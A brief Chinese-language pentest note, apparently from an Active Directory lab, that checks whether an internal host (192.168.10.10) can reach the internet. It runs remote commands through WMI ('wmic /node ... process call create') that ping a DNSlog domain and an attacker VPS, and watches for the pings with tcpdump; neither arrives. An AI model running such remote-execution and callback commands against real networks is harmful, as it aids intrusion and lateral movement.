1.通过DNSlog （http://www.dnslog.cn/）

```
shell wmic /node:192.168.10.10 process call create "cmd.exe /c ping g2azxa.dnslog.cn"
```

![img](D:\AD\note\images\beepress-image-171523-1639619963.png)

2.通过tcpdump

```
tcpdump -i 网卡名 icmp

shell wmic /node:192.168.10.10 process call create "cmd.exe /c ping VPSip"
```

![img](D:\AD\note\images\beepress-image-171523-16396199631.png)

两种方法都没有回显，192.168.10.10不出网。